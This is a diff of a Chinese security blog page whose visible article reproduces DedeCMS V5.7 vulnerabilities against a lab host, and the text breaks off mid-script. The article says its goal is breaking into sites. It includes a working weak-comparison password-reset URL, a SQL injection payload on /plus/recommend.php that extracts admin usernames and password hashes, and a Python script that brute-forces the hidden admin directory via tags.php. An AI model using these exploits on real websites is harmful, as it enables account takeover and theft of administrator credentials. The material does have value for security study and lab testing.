@@ -6,45 +6,34 @@
   <meta name="keywords" content=" dede , cms ">
   <meta name="description" content="织梦内容管理系统(DedeCMS)漏洞集合 | BigSwords">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="织梦内容管理系统(DedeCMS)，是一个集内容发布、编辑、管理检索等于一体的网站管理系统(Web CMS)，是我遇见漏洞最多的cms了，用的网站还不少，特别是结合现已爆出的各种漏洞可以说是只要遇到就有很大的把握可以拿下，本篇文章就已结合突破为目的对漏洞进行复现整理 0x00环境IP：192.168.10.67Dede版本：DedeCMS-V5.7-GBK-SP1-FullWAF：SafeDog">
-<meta name="keywords" content="dede,cms">
+<meta name="description" content="ThinkPHP 是一个快速、简单的基于 MVC 和面向对象的轻量级 PHP 开发框架，遵循 Apache2 开源协议发布。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重开发体验和易用性，为 WEB 应用和 API 开发提供了强有力的支持。 前言本篇文章将针对ThinkPHP的历史漏洞进行整理复现，今后爆出的ThinkPHP漏洞，也将进行补充更新。">
+<meta name="keywords" content="ThinkPHP,框架">
 <meta property="og:type" content="article">
-<meta property="og:title" content="织梦内容管理系统(DedeCMS)漏洞集合">
-<meta property="og:url" content="https:&#x2F;&#x2F;bigswords.github.io&#x2F;2019&#x2F;12&#x2F;05&#x2F;3&#x2F;index.html">
+<meta property="og:title" content="ThinkPHP漏洞总结">
+<meta property="og:url" content="https:&#x2F;&#x2F;bigswords.github.io&#x2F;2019&#x2F;12&#x2F;20&#x2F;4&#x2F;index.html">
 <meta property="og:site_name" content="BigSwords">
-<meta property="og:description" content="织梦内容管理系统(DedeCMS)，是一个集内容发布、编辑、管理检索等于一体的网站管理系统(Web CMS)，是我遇见漏洞最多的cms了，用的网站还不少，特别是结合现已爆出的各种漏洞可以说是只要遇到就有很大的把握可以拿下，本篇文章就已结合突破为目的对漏洞进行复现整理 0x00环境IP：192.168.10.67Dede版本：DedeCMS-V5.7-GBK-SP1-FullWAF：SafeDog">
+<meta property="og:description" content="ThinkPHP 是一个快速、简单的基于 MVC 和面向对象的轻量级 PHP 开发框架，遵循 Apache2 开源协议发布。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重开发体验和易用性，为 WEB 应用和 API 开发提供了强有力的支持。 前言本篇文章将针对ThinkPHP的历史漏洞进行整理复现，今后爆出的ThinkPHP漏洞，也将进行补充更新。">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;acfadfae9f192185b326e40ec22c5a27.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;4e6c69e4e5b2498644f007518bfa33b8.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;345e97bbff04eb09e5f01866b7a89097.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;3e2eb0b4d010468d42386874a4fd340f.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;2af0a7fb18ca3dd31f2ec7913acba1b4.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;90f3302c76c81efc53ef8a08d05d2063.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;85b3cb14ba5197fe782760885d855aba.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;62e11faeb958b0bddfdfce6b655fb819.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;a7651fbd119438b5ce8ecf626151d901.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;534ba4aca3e02d5bd6f3d30704dd42bc.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;2b965cbd999a534feb78d0e9b5de4093.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;6ce5fbc99c37d35698859fe04e549010.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;747b72b98f96b05afa34cb89a94a04df.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;94c056a2040594eb3fae9422d3d4aafc.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;89981253b084fd63d7bf118898677732.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;87ae26a58386a93c5fe2dbca75a08492.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;5d9145fd1e30e6e253f63339cfb20193.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;5d64d1343f8a75d1bf43dab04785a49f.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;b0b38524c3a517133fe7788bc2cae796.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;ee00e467d0c915e258345786942301d5.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;3b10323e6fa1a276229cdcbc1fa7c44b.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;fb64e3dcb7b7badf703eae30cd067c22.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;63b7f0ec304096a9e399f5eefba38a5f.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;4535e22693da5bd6116b29e7b74b5729.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191122&#x2F;596931b12adecf11e124490cff6b7f66.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191122&#x2F;4ea1414d8034fe328fb2392d14fb9bc9.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191122&#x2F;914ed0eb9e0bb81e099b8ab5042526b4.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191205&#x2F;171384c8355cb9b1284fbf753cdc6d35.png">
-<meta property="og:updated_time" content="2019-12-05T07:34:16.353Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;02b59cfc58d675df0a9e6a6504b4ecf4.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;9c57d647e53818df70f04dc7d339e8ff.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;de597a9131929fca7e8cd4c6cca44576.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;a4180480316757a4e222fb666b755f9e.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;87fe7fd2082ba68d27b7353f44e5aa87.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;813d568f9483ae9fbc84e83b17eeea81.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;2cfe2ea95acd80d4783a66dfcf2b097c.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;9fd040e70625857a925760814c5cfd88.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;47e943cd1acba4c95e82471c038eea80.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;50ff54ea3e1a44f4be2dfba634b82aaf.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;d1cc9e98eaec43f46e0f6b13113349f5.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;d53c716a02ce8753e3e1513915ad17fa.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;ea842a59a0b267116f44988731990116.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;a3625cb2e2543725301af1de996438c4.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;d48c037742188d28c9e2f29a0b788763.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;939d6f3e1692fbbf6c6cc00a6a427fe0.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;d64a5375a5cd1a80f664f314ae7984aa.png">
+<meta property="og:updated_time" content="2019-12-23T11:13:26.315Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191121&#x2F;acfadfae9f192185b326e40ec22c5a27.png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;02b59cfc58d675df0a9e6a6504b4ecf4.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -171,7 +160,7 @@
     
         
             
-            <li><div data-rel="框架漏洞">框架漏洞<small>(1)</small></div>
+            <li><div data-rel="CMS漏洞">CMS漏洞<small>(1)</small></div>
                 
             </li>
             
@@ -179,7 +168,7 @@
     
         
             
-            <li><div data-rel="CMS漏洞">CMS漏洞<small>(1)</small></div>
+            <li><div data-rel="框架漏洞">框架漏洞<small>(1)</small></div>
                 
             </li>
             
@@ -232,19 +221,19 @@
     <div class="tags-list">
     
     <li class="article-tag-list-item">
-        <a class="color4">ThinkPHP</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color3">框架</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color5">dede</a>
     </li>
     
     <li class="article-tag-list-item">
         <a class="color4">cms</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">ThinkPHP</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">框架</a>
     </li>
     
     <div class="clearfix"></div>
@@ -253,20 +242,20 @@
     
     <nav id="title-list-nav">
         
-        <a  class="框架漏洞 "
-           href="/2019/12/20/4/"
-           data-tag="ThinkPHP,框架"
-           data-author="" >
-            <span class="post-title" title="ThinkPHP漏洞总结">ThinkPHP漏洞总结</span>
-            <span class="post-date" title="2019-12-20 15:56:08">2019/12/20</span>
-        </a>
-        
         <a  class="CMS漏洞 "
            href="/2019/12/05/3/"
            data-tag="dede,cms"
            data-author="" >
             <span class="post-title" title="织梦内容管理系统(DedeCMS)漏洞集合">织梦内容管理系统(DedeCMS)漏洞集合</span>
             <span class="post-date" title="2019-12-05 14:58:23">2019/12/05</span>
+        </a>
+        
+        <a  class="框架漏洞 "
+           href="/2019/12/20/4/"
+           data-tag="ThinkPHP,框架"
+           data-author="" >
+            <span class="post-title" title="ThinkPHP漏洞总结">ThinkPHP漏洞总结</span>
+            <span class="post-date" title="2019-12-20 15:56:08">2019/12/20</span>
         </a>
         
         <a  class=""
@@ -315,7 +304,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-12-05 15:34:16'>2019-12-05 14:58</time>
+        创建时间:<time class="date" title='更新时间: 2019-12-23 19:13:24'>2019-12-05 14:58</time>
         
     </div>
     <div class="article-meta">
@@ -350,7 +339,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00环境"><span class="toc-text">0x00环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01站点识别"><span class="toc-text">0x01站点识别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02Dede前台漏洞"><span class="toc-text">0x02Dede前台漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-前台任意账号密码修改-账号未设置安全问题"><span class="toc-text">1.前台任意账号密码修改(账号未设置安全问题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-cookie伪造导致任意前台用户登录"><span class="toc-text">2.cookie伪造导致任意前台用户登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-任意重置后台用户密码"><span class="toc-text">3.任意重置后台用户密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-前台台任意文件上传"><span class="toc-text">4.前台台任意文件上传</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03Dede后台突破"><span class="toc-text">0x03Dede后台突破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-plus-recommend-php文件注入漏洞"><span class="toc-text">1./plus/recommend.php文件注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-plus-search-php注入漏洞"><span class="toc-text">2.plus/search.php注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-后台路径突破"><span class="toc-text">3.后台路径突破</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04Dede后台漏洞"><span class="toc-text">0x04Dede后台漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-文件式管理器"><span class="toc-text">1.文件式管理器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-模块-广告"><span class="toc-text">2.模块-广告</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-模板-默认模板管理"><span class="toc-text">3.模板-默认模板管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-模板-标签源码"><span class="toc-text">4.模板-标签源码</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#站点识别"><span class="toc-text">站点识别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dede前台漏洞"><span class="toc-text">Dede前台漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-前台任意账号密码修改-账号未设置安全问题"><span class="toc-text">1.前台任意账号密码修改(账号未设置安全问题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-cookie伪造导致任意前台用户登录"><span class="toc-text">2.cookie伪造导致任意前台用户登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-任意重置后台用户密码"><span class="toc-text">3.任意重置后台用户密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-前台台任意文件上传"><span class="toc-text">4.前台台任意文件上传</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dede后台突破"><span class="toc-text">Dede后台突破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-plus-recommend-php文件注入漏洞"><span class="toc-text">1./plus/recommend.php文件注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-plus-search-php注入漏洞"><span class="toc-text">2.plus/search.php注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-后台路径突破"><span class="toc-text">3.后台路径突破</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dede后台漏洞"><span class="toc-text">Dede后台漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-文件式管理器"><span class="toc-text">1.文件式管理器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-模块-广告"><span class="toc-text">2.模块-广告</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-模板-默认模板管理"><span class="toc-text">3.模板-默认模板管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-模板-标签源码"><span class="toc-text">4.模板-标签源码</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -367,10 +356,10 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>织梦内容管理系统(DedeCMS)，是一个集内容发布、编辑、管理检索等于一体的网站管理系统(Web CMS)，是我遇见漏洞最多的cms了，用的网站还不少，特别是结合现已爆出的各种漏洞可以说是只要遇到就有很大的把握可以拿下，本篇文章就已结合突破为目的对漏洞进行复现整理</p>
-<h2 id="0x00环境"><a href="#0x00环境" class="headerlink" title="0x00环境"></a>0x00环境</h2><p>IP：192.168.10.67<br>Dede版本：DedeCMS-V5.7-GBK-SP1-Full<br>WAF：SafeDog</p>
-<h2 id="0x01站点识别"><a href="#0x01站点识别" class="headerlink" title="0x01站点识别"></a>0x01站点识别</h2><p>dede的站点特征还是很明显的，主要从两个地方观察，主页和会员登录界面<br>可以使用谷歌插件wappalyzer或者丢给云悉等等指纹识别站点<br><img src="http://zone.secevery.com/uploads/article/20191121/acfadfae9f192185b326e40ec22c5a27.png" class="img-polaroid" title="TIM截图20191121174539.png" alt="TIM截图20191121174539.png"></p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>IP：192.168.10.67<br>Dede版本：DedeCMS-V5.7-GBK-SP1-Full<br>WAF：SafeDog</p>
+<h2 id="站点识别"><a href="#站点识别" class="headerlink" title="站点识别"></a>站点识别</h2><p>dede的站点特征还是很明显的，主要从两个地方观察，主页和会员登录界面<br>可以使用谷歌插件wappalyzer或者丢给云悉等等指纹识别站点<br><img src="http://zone.secevery.com/uploads/article/20191121/acfadfae9f192185b326e40ec22c5a27.png" class="img-polaroid" title="TIM截图20191121174539.png" alt="TIM截图20191121174539.png"></p>
 <p>也可以通过特殊目录来判断，可以看robots.txt文件<br><img src="http://zone.secevery.com/uploads/article/20191121/4e6c69e4e5b2498644f007518bfa33b8.png" class="img-polaroid" title="TIM截图20191121175110.png" alt="TIM截图20191121175110.png"></p>
-<h2 id="0x02Dede前台漏洞"><a href="#0x02Dede前台漏洞" class="headerlink" title="0x02Dede前台漏洞"></a>0x02Dede前台漏洞</h2><p><a href="http://192.168.10.67/DedeCMS-V5.7-GBK-SP1-Full/uploads/" target="_blank" rel="noopener">http://192.168.10.67/DedeCMS-V5.7-GBK-SP1-Full/uploads/</a></p>
+<h2 id="Dede前台漏洞"><a href="#Dede前台漏洞" class="headerlink" title="Dede前台漏洞"></a>Dede前台漏洞</h2><p><a href="http://192.168.10.67/DedeCMS-V5.7-GBK-SP1-Full/uploads/" target="_blank" rel="noopener">http://192.168.10.67/DedeCMS-V5.7-GBK-SP1-Full/uploads/</a></p>
 <h3 id="1-前台任意账号密码修改-账号未设置安全问题"><a href="#1-前台任意账号密码修改-账号未设置安全问题" class="headerlink" title="1.前台任意账号密码修改(账号未设置安全问题)"></a>1.前台任意账号密码修改(账号未设置安全问题)</h3><p>原理：系统从数据库中获取safequestion，然后与传过来的数据进行判等。用的是双等号，又因为用户没有设置安全问题，数据库里面默认存的是0。<br><img src="http://zone.secevery.com/uploads/article/20191121/345e97bbff04eb09e5f01866b7a89097.png" class="img-polaroid" title="1205477-20180111135811160-1036662100.png" alt="1205477-20180111135811160-1036662100.png"></p>
 <p>通过php弱类型的转换’0.0’ == ‘0’了。（内部运算：先是把0.0（浮点数（0.0）转换为int(0)，然后字符串(‘0’)转换为int(0)，最后 0==0 ，所以相等了。）<br>直接传0是不行的，因为代码中有empty函数的判断，当然也可以利用十六进制比如:0x0</p>
 <p>先进行如下请求获取key<br><a href="http://192.168.10.67/DedeCMS-V5.7-GBK-SP1-Full/uploads/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;id=1" target="_blank" rel="noopener">http://192.168.10.67/DedeCMS-V5.7-GBK-SP1-Full/uploads/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;id=1</a><br><img src="http://zone.secevery.com/uploads/article/20191121/3e2eb0b4d010468d42386874a4fd340f.png" class="img-polaroid" title="TIM截图20191121190147.png" alt="TIM截图20191121190147.png"></p>
@@ -395,7 +384,7 @@
 
 
 <p>由于配置问题可能会造成如下文件管理器的未授权访问以进行上传绕过<br>但一般网站会对如下连接做一个跳转<br><a href="http://192.168.10.67/DedeCMS-V5.7-GBK-SP1-Full/uploads/include/dialog/select_images.php" target="_blank" rel="noopener">http://192.168.10.67/DedeCMS-V5.7-GBK-SP1-Full/uploads/include/dialog/select_images.php</a><br><img src="http://zone.secevery.com/uploads/article/20191121/5d9145fd1e30e6e253f63339cfb20193.png" class="img-polaroid" title="TIM截图20191121192613.png" alt="TIM截图20191121192613.png"></p>
-<h2 id="0x03Dede后台突破"><a href="#0x03Dede后台突破" class="headerlink" title="0x03Dede后台突破"></a>0x03Dede后台突破</h2><p>通过以上漏洞我们已近做到了修改管理员密码，只要拿到后台路径便可已进入后台操作，但也不能排除网站没有开启前台的会员中心这种情况</p>
+<h2 id="Dede后台突破"><a href="#Dede后台突破" class="headerlink" title="Dede后台突破"></a>Dede后台突破</h2><p>通过以上漏洞我们已近做到了修改管理员密码，只要拿到后台路径便可已进入后台操作，但也不能排除网站没有开启前台的会员中心这种情况</p>
 <h3 id="1-plus-recommend-php文件注入漏洞"><a href="#1-plus-recommend-php文件注入漏洞" class="headerlink" title="1./plus/recommend.php文件注入漏洞"></a>1./plus/recommend.php文件注入漏洞</h3><p>可使用exp直接爆出管理员账号密码<br>EXP如下：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">/plus/recommend.php?action=&amp;aid=1&amp;_FILES[<span class="built_in">type</span>][tmp_name]=\<span class="string">' or mid=@`\'</span>` union select 1,2,3,(select concat(0x7c,userid,0x7c,<span class="built_in">pwd</span>) from `%23@__admin` <span class="built_in">limit</span> 0,1),5,6,7,8,9%23@`\<span class="string">'`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type]=11</span></span></pre></td></tr></table></figure>
 
@@ -417,7 +406,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">import requests</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">import itertools</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">characters = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789_!#"</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">back_dir = <span class="string">""</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">flag = 0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">url = <span class="string">"http://192.168.10.67/DedeCMS-V5.7-GBK-SP1-Full/uploads/tags.php"</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">data = &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    <span class="string">"_FILES[mochazz][tmp_name]"</span> : <span class="string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span>,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    <span class="string">"_FILES[mochazz][name]"</span> : 0,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    <span class="string">"_FILES[mochazz]"</span> : 0,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">    <span class="string">"_FILES[mochazz][type]"</span> : <span class="string">"image/gif"</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(1,7):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> flag:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">        <span class="built_in">break</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">for</span> pre <span class="keyword">in</span> itertools.permutations(characters,num):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">        pre = <span class="string">''</span>.join(list(pre))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">        data[<span class="string">"_FILES[mochazz][tmp_name]"</span>] = data[<span class="string">"_FILES[mochazz][tmp_name]"</span>].format(p=pre)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">        <span class="built_in">print</span>(<span class="string">"testing"</span>,pre)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">        r = requests.post(url,data=data)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">if</span> <span class="string">"Upload filetype not allow !"</span> not <span class="keyword">in</span> r.text and r.status_code == 200:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">            flag = 1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">            back_dir = pre</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">            data[<span class="string">"_FILES[mochazz][tmp_name]"</span>] = <span class="string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">            <span class="built_in">break</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">else</span>:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">            data[<span class="string">"_FILES[mochazz][tmp_name]"</span>] = <span class="string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">"[+] pre:"</span>,back_dir)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">flag = 0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(30):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> flag:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">        <span class="built_in">break</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> characters:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">if</span> ch == characters[-1]:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">            flag = 1</span></pre></td></tr><tr><td class="gutter"><pre><span 